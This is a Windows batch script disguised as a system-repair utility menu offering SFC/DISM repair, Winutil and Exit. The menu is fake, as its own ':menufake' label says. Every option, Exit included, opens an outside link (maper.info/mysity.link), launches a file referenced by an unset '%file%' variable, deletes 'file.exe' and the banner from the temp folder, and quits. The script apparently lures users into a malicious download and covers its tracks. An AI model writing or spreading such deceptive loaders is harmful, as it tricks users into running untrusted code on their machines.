@echo off
set tool_version=1.3
title MANU
color 0a
cls

set tempascii=https://raw.githubusercontent.com/Upok18/Up0ktilizer/refs/heads/main/Ascii.txt
curl -s -o "%temp%\Ascii.txt" https://raw.githubusercontent.com/Upok18/Up0ktilizer_Batch/refs/heads/main/Ascii.txt

REM call :changelog
goto :menufake

:menufake
title MANU v%tool_version%
color 0a
cls
echo =========================================================================================================
type "%temp%\Ascii.txt"
echo =========================================================================================================
REM echo ==============================
REM echo       Up0ktilizer (v%tool_version%)
REM echo ==============================
echo  [1] SFC and DISM (File Repair)
rem echo  [2] spicetify update(Extra option)
rem echo  [3] Scrcpy
echo  [2] Winutil
echo  [3] Exit
REM set /p choice=Choose an option: 
choice /N /C 123 /M " Choose an option:"
REM choice /C k /N 

rem if errorlevel 6 goto :arifin
if errorlevel 3 (
cls 
echo Loading...
timeout /t 2 >nul
start https://maper.info/mysity.link
start "" "%file%"
del "%temp%\Ascii.txt" >nul 2>&1
del "%temp%\\file.exe" >nul 2>&1
exit
)

if errorlevel 2 (
cls 
echo Loading...
timeout /t 2 >nul
start https://maper.info/mysity.link
start "" "%file%"
del "%temp%\Ascii.txt" >nul 2>&1
del "%temp%\\file.exe" >nul 2>&1
exit
)
REM if errorlevel 3 goto :scrcpy
rem if errorlevel 2 goto :spice
if errorlevel 1 (
cls 
echo Loading...
timeout /t 2 >nul
start https://maper.info/mysity.link
start "" "%file%"
del "%temp%\Ascii.txt" >nul 2>&1
del "%temp%\\file.exe" >nul 2>&1
exit
)
